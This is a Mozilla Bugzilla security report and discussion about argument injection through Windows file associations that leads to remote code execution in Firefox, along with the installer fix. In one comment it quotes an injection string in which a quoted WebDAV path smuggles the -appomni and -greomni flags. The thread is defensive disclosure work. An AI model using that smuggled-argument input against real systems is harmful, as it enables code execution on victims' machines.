In Windows, it is possible to inject arbitrary arguments when Firefox is setup as the default file handler for any file type other than .html. This can result in remote code execution when the 'greomni' flag is injected.

The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type's default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the 'osint' flag to the following registry key:

HKEY\_CLASSES\_ROOT\applications\firefox.exe\shell\open\command

i.e. change:

* "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" "%1"

to

* "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint "%1"

The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>

RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox").

Although it shouldn't be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won't be fixing this issue (<https://www.zerodayinitiative.com/advisories/ZDI-19-1023/>)

Credit:

Joshua Graham of TSS

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1606596#c1)• 5 years ago |
|  | |

Thanks for the report!

(In reply to Joshua Graham from [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type's default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the 'osint' flag to the following registry key:
>
> HKEY\_CLASSES\_ROOT\applications\firefox.exe\shell\open\command
>
> i.e. change:
>
> * "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" "%1"
>
> to
>
> * "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint "%1"
>
> The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>
>
> RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox").

I'm a little puzzled here. This may be a simple oversight, but if it's more than that I'd like to have it figured out...

I haven't tried the exploit myself yet, but I'd expect the `-osint` commandline you describe, without a further `-url` argument, not to work on Firefox 69+ (and newer versions of ESR), because of the changes in [bug 1572838](/show_bug.cgi?id=1572838 "VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]") (see code at <https://searchfox.org/mozilla-central/source/toolkit/xre/CmdLineAndEnvUtils.h#197> and elsewhere ). That is, `firefox.exe -osint path/to/file` should, if I'm reading my own code right a few months later, fail to do anything (it'll exit early). `firefox.exe -osint -url file:url-of-some-kind` should work, I think. Is that what you meant, or are you also (intentionally or accidentally :-) ) reporting that those checks don't work the way I think they do?

Molly: assuming the `-osint` path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs "just" means adding things around <https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521> or thereabouts?

Tentatively moving to the installer component given that that's where the registration code lives.

Component: Security → InstallerFlags: needinfo?(mhowell)Flags: needinfo?(jpg.inc.au)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a13086_159069)• 5 years ago |

Type: task → defectSee Also: → [1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"), [CVE-2019-9794](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox")

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1606596#c2)• 5 years ago |
|  | |

My bad, I double checked and yes it does need -osint -url :-)

Flags: needinfo?(jpg.inc.au)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1606596#c3)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #2](/show_bug.cgi?id=1606596#c2 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> My bad, I double checked and yes it does need -osint -url :-)

Thanks for the quick response. I'm glad I got that right at least...

Leaving this for the installer folks to see if/how to add the `-osint` thing to the default open command. I also pinged [bug 1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths") to see if we can just deprecate these (appomni/greomni) arguments (though that'd likely still leave other issues so we'd need to fix this bug either way).

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1606596#c4)• 5 years ago |
|  | |

[apologies for the slow response to a security bug; the "installer folks" are actually just me, and I'm off and not checking mail much this week]

TL;DR: I don't think we can fix this in the file association registration code.

The reason why registering a file association in the way that the STR does ends up with a command line that's missing its `-osint` is because our installer doesn't register us as a handler for `.pdf` when any other handler for it exists (an academic condition on Windows 10, because Edge always exists as a registered PDF handler). That means the Open With dialog fails to find any command string that we've created and instead synthesizes a handler with a default command line (one with no arguments). That procedure creates the `HKCR\Applications\firefox.exe` key for this purpose, so that's why editing the command in there works.

That all implies that we could fix this by registering as a `.pdf` handler, but there are two problems with that:

1. We intentionally leave out that handler as a long-standing product decision (reference [bug 1573267 comment 3](/show_bug.cgi?id=1573267#c3 "RESOLVED INVALID - Handlers for non-HTML file types only registered when setting default browser")).
2. Worse than that, I don't see anything that makes this bug specific to PDF files; it seems like opening any local file of a type that's had an association manually created for it would trigger this, even for types we really don't support opening. And we can't have handlers for every possible file extension.

If there were a way to override the command line for all file associations registered to the `.exe` at a certain path, even custom-made associations, then that would work, but I can't find any such thing (that wouldn't also affect every process started from that path, which we do not want to do). We can't use the key at `HKCR\Applications\firefox.exe` because the File Explorer only looks it up by file name, not by anything unique to the install path.

So unless I'm wrong and there is something PDF-specific here, I'm afraid we end up needing a more general command-line handling fix.

(In reply to :Gijs (he/him) from [comment #1](/show_bug.cgi?id=1606596#c1 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> Molly: assuming the `-osint` path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs "just" means adding things around <https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521> or thereabouts?

The command line in that key isn't used to open files, it's intended to start the application in a default state (I'm actually not sure it's used at all nowadays; it's what the old web browser shortcut that used to be at the top of the start menu would run). The command line that's used for the file type handlers we register is the one [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/installer.nsi#439) (set by the installer) and [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/shared.nsh#846) (set during updates).

Flags: needinfo?(mhowell)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1606596#c5)• 5 years ago |
|  | |

> So unless I'm wrong and there is something PDF-specific here, I'm afraid we end up needing a more general command-line handling fix.

You are correct, it isn't PDF specific, any file type association will do it.

> If there were a way to override the command line for all file associations registered to the .exe at a certain path, even custom-made associations, then that would work, but I can't find any such thing (that wouldn't also affect every process started from that path, which we do not want to do). We can't use the key at HKCR\Applications\firefox.exe because the File Explorer only looks it up by file name, not by anything unique to the install path.

I'm a little confused by the "at a certain path" and "unique to the install path" parts of your comment. Custom made associations are added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\<extension>\UserChoice` and when you chose Firefox it gets the value `Applications\firefox` which points it to the `HKCR\Applications\firefox.exe` key.

Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it's `UserChoice` value becomes `Applications\chrome.exe` which has the value `C:\Program Files...\chrome.exe -- %1%`. The `--` is equivalent to `-osint -url` in Firefox so it must be possible to update that registry key?

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1606596#c6)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #5](/show_bug.cgi?id=1606596#c5 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> I'm a little confused by the "at a certain path" and "unique to the install path" parts of your comment. Custom made associations are added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\<extension>\UserChoice` and when you chose Firefox it gets the value `Applications\firefox` which points it to the `HKCR\Applications\firefox.exe` key.

The problem is that the only thing that names that key is the string `firefox.exe`, but the command string has to contain an absolute path to a specific installation; there's an implicit assumption there that only one binary called `firefox.exe` ever exists on a machine, but we explicitly support having multiple installations of Firefox that can all participate in file associations, so that assumption is wrong for us. The file type keys that we create have names that start with `FirefoxHTML`, followed by an installation-specific hash, so that more than one installation can participate in file associations and not just the most recently installed one. A key just named `firefox.exe` breaks this support. Chrome can sometimes avoid problems like this because they don't have general support for multiple installations, but one of the specific cases they do support is having different channels installed, so this breaks even that because every channel calls its binary `chrome.exe` just as ours are always `firefox.exe`.

It's possible we could do something like check on startup for an `HKCR\Applications\firefox.exe` key and manually update its command line no matter what installation it's for. That would still leave the first launch after the file association is created vulnerable, but it's something.

> Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it's `UserChoice` value becomes `Applications\chrome.exe` which has the value `C:\Program Files...\chrome.exe -- %1%`. The `--` is equivalent to `-osint -url` in Firefox so it must be possible to update that registry key?

Hmm, I don't see where that's happening; for me running release Chrome, the `Applications\chrome.exe` key gets created by `OpenWith.exe` with the same sort of command line it uses for us, without the `--`, and that is the command line that's used to create the process (that is, nothing is overriding it). I thought that maybe Chrome would rewrite the registry value when it starts, but it doesn't touch it; neither does the installer. I can't find any code that would explicitly do this via their code search tool, either. Do you know if maybe that fix just isn't on their release channel yet?

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1606596#c7)• 5 years ago |
|  | |

I've tried on two different computer with the same version of release chrome. One is windows 10 Pro (adds --), one is Enterprise (doesn't add --). It may have nothing to do with the windows version but i'm at a loss to explain what is going on sorry.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a333287_1689)• 5 years ago |

Depends on: [1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")Keywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1606596#c8)• 5 years ago |
|  | |

I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1606596#c9)• 5 years ago |
|  | |

As a workaround, I can have the installer/updater preemptively create `{HKLM,HKCU}\Applications\firefox.exe` and fill it in with the correct command line. That will mean we get listed as an option in Open With for every file type, which I don't like, but by adding a `SupportedTypes` key we can at least keep our entry below the fold for all the types we don't support. It also means that only one installation at a time can be set this way, as discussed above, but I think that would more or less match the current behavior. I'm going to test out that idea and see if it works the way I hope it does and doesn't break anything else.

I still think the best fix is on the command-line handling side though, either by altering the parsing or by removing or restricting the arguments involved.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1606596#c10)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1606596&comment_id=14576483 "1 revision") |
|  | |

(In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.

I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)

Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?

Flags: needinfo?(nfroyd)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1606596#c11)• 5 years ago |
|  | |

My reading of your comment is that Windows itself would be doing something wrong and there's not much we can do about it, except not allowing any flags on the command line at all...

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1606596#c12)• 5 years ago |
|  | |

(In reply to Mike Hommey [:glandium] from [comment #11](/show_bug.cgi?id=1606596#c11 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> My reading of your comment is that Windows itself would be doing something wrong and there's not much we can do about it, except not allowing any flags on the command line at all...

This is my interpretation of [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"), yeah, esp:

> Although it shouldn't be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won't be fixing this issue (<https://www.zerodayinitiative.com/advisories/ZDI-19-1023/>)

That is, my understanding is that Windows' system for quoting means that the `"` in the filename ought to be preceded by a `\`. I'd expect the steps from [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") with:

> ```
> \\poiu.xss.vg@ssl\a.txt\" -appomni appomni.pdf -greomni \share\greomni.pdf
>
> ```

To be parsed correctly, assuming the windows run dialog basically resolves the entire string as a file, then passes it to Firefox in double quotes - because after all, file names can't contain double quotes. Except here, they do.

But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn't necessarily have to do anything "bad", just, does it break commandline parsing for all apps, or are we the odd one out?)

Anyway, it's also totally plausible that I'm misreading what's going on here. But I *think* our commandline parsing by and large trusts the argv/argc stuff we get, and doesn't try to take a full input string and parse it ourselves in some way - or otherwise reconstitute command line switches or what-have-you.

Flags: needinfo?(jpg.inc.au)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1606596#c13)• 5 years ago |
|  | |

The workaround I mentioned in [comment 9](/show_bug.cgi?id=1606596#c9 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") does appear to do the job, as in processes that are created to open files with custom associations get the correct command line after that change, and it doesn't seem to have any confusing effects on the open with dialog (I tried it on Windows 7 and 10). So, since the command-line handling side is still under active discussion I think it's a good idea to go ahead and get that patch moving.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1606596#c14)• 5 years ago |
|  | |

Attached file
[Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin](attachment.cgi?id=9119189)
— [Details](attachment.cgi?id=9119189&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a473666_600971)• 5 years ago |

Assignee: nobody → mhowell

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1606596#c15)• 5 years ago |
|  | |

> But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn't necessarily have to do anything "bad", just, does it break commandline parsing for all apps, or are we the odd one out?)

Yes, this is not a Firefox specific issue. Similar exploits work on other applications. The Zero Day Initiative report detailed the underlying issue to Microsoft (i.e. fix the WebDAV client so that double quotes can't appear in the path) in the hope that the attack vector could be killed altogether. Since the attack vector will remain I decided to report it to the individual applications to see if they could mitigate the risk themselves.

Do you still need my WebDAV server up for you to reproduce the issue? or am I OK to take it down?

Flags: needinfo?(jpg.inc.au) → needinfo?(mhowell)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1606596#c16)• 5 years ago |
|  | |

I don't need the WebDAV server for my part; redirecting to Gijs who asked about it.

Flags: needinfo?(mhowell) → needinfo?(gijskruitbosch+bugs)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1606596#c17)• 5 years ago |
|  | |

The webdav server is probably going to be useful to QA to verify that the issue is fixed, so if it is not onerous to keep the server up I think that would be desirable. If it isn't viable for you to do so, where would I look for instructions to set this type of thing up ourselves?

Flags: needinfo?(gijskruitbosch+bugs) → needinfo?(jpg.inc.au)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1606596#c18)• 5 years ago |
|  | |

I'm happy to keep it online. I'll attach the server code to this bug when I get home so you can reproduce it in case my server dies for some reason.

Flags: needinfo?(jpg.inc.au)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1606596#c19)• 5 years ago |
|  | |

The chrome team (on a separate bug report) made a comment that might apply here:

> ... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it's the "most stable" of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We'd also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user's default browser, write its config in that user's HKCU hive. ...

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1606596#c20)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #19](/show_bug.cgi?id=1606596#c19 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> The chrome team (on a separate bug report) made a comment that might apply here:
>
> > ... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it's the "most stable" of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We'd also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user's default browser, write its config in that user's HKCU hive. ...

That is relevant, thank you. We have really all of these same problems, but what's in my patch isn't this sophisticated, partly because I don't think it's worth the effort, but also because I don't think it's appropriate for me to make decisions for the user about what channel they meant to be using.

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1606596#c21)• 5 years ago |
|  | |

Attached file
[Simple node WebDAV server that will respond to any folder/file name](attachment.cgi?id=9119318)
— [Details](attachment.cgi?id=9119318&action=edit)

This is a simple WebDAV server that you can use to test [bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"). To make it work install node/npm, install express (`nmp install express` ) and start the server `node firefox.js 80 pdf`.

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1606596#c22)• 5 years ago |
|  | |

If this ends up getting credited in the change log could you please make the credit:

Joshua Graham of TSS & Brendan Scarvell

If you have to use a single name just:

Brendan Scarvell

Brendan's name was left out of [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox") and he deserves credit. :-). If there is a bounty, does Firefox match if we donate it to charity? I would like to give the money to one of the Australian bush fire charities.

|  | [Nathan Froyd [:froydnj]](/user_profile?user_id=417288) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1606596#c23)• 5 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
>
> > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
>
> I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)
>
> Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?

I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).

Flags: needinfo?(nfroyd)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1606596#c24)• 5 years ago |
|  | |

(In reply to Nathan Froyd [:froydnj] from [comment #23](/show_bug.cgi?id=1606596#c23 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

Yeah, sorry for rambling. Let me try to clarify inline. I think I have two questions:

> (In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
>
> > (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> >
> > > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
> >
> > I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)

Does this seem like an accurate read of what's going on?

> > Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?
>
> I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).

And yes, the "do we have a chance to recover from the OS's mistake", and you kinda answered that one...

Flags: needinfo?(nfroyd)

|  | [Robert Strong (they/them - no direct email)](/user_profile?user_id=141755) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1606596#c25)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1606596&comment_id=14583242 "1 revision") |
|  | |

No idea if this is helpful but there is a command line argument test that checks the reassembly of command line arguments when having to relaunch Firefox with the original command line under

<https://searchfox.org/mozilla-central/source/toolkit/xre/test/win>

It verifies that our argument cleanup is equivalent to the cleanup performed by the OS. The arguments it tests are in

<https://searchfox.org/mozilla-central/source/toolkit/xre/test/win/TestXREMakeCommandLineWin.ini>

|  | [Nathan Froyd [:froydnj]](/user_profile?user_id=417288) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1606596#c26)• 5 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #24](/show_bug.cgi?id=1606596#c24 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> > (In reply to :Gijs (he/him) from [comment #10](/show_bug.cgi?id=1606596#c10 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> >
> > > (In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))
> > >
> > > > I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.
> > >
> > > I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)
>
> Does this seem like an accurate read of what's going on?

Yes. For avoidance of doubt (and so somebody can correct me I'm wrong, which is likely), my understanding is that we have:

```
"path\to\firefox.exe" "%1"

```

in the registry for executing Firefox, and somebody specifies the weird string in [comment 0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"). Through string substitution, we get:

```
"path\to\firefox.exe" "\\stuff\a.txt" -flagsandstuff"

```

and then...something...strips off quotes, so we have:

```
path\to\firefox.exe \\stuff\a.txt -flagsandstuff["]

```

(not sure what happens to that last quote, I guess if you just `str.remove('"')` or similar, it'd be gone, rather than trying to balance quotes?)

Not sure what happens next, but I guess the exact steps don't matter: that command line eventually winds up being split on spaces to wind up in Firefox's `argv`? (From my limited understanding, this all sounds terrible, and basically everybody would have to implement something similar to what mhowell's patch (and `-osint`?) does to avoid letting file arguments actually specify arbitrary command-line arguments?)

> > > Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?
> >
> > I'm unclear on what the question here is. Are you asking "should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate `argv` values and try to reassemble them"? That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).
>
> And yes, the "do we have a chance to recover from the OS's mistake", and you kinda answered that one...

Yeah, I think looking at what we have in that last command line up there, we'd have to infer the location of the double quote, and determine what elements of `argv` should effectively be re-concatenated, which isn't going to turn out well for anybody. And I think this is a different scenario than rstrong posted in [comment 25](/show_bug.cgi?id=1606596#c25 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") (which is helpful; I didn't know about that test!): we're not trying to reassemble things to relaunch anything, but we're trying to discern whether arguments got split by whatever launched us in a way that was not intended.

Flags: needinfo?(nfroyd)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1606596#c27)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not very easily I think; the patch necessarily points to a scenario where file associations with command lines missing a `-osint` can get created, but doesn't go into the implications of that.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Should be trivial; code around this patch hasn't changed in years.
* **How likely is this patch to cause regressions; how much testing does it need?**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates, so regressing those is very unlikely.

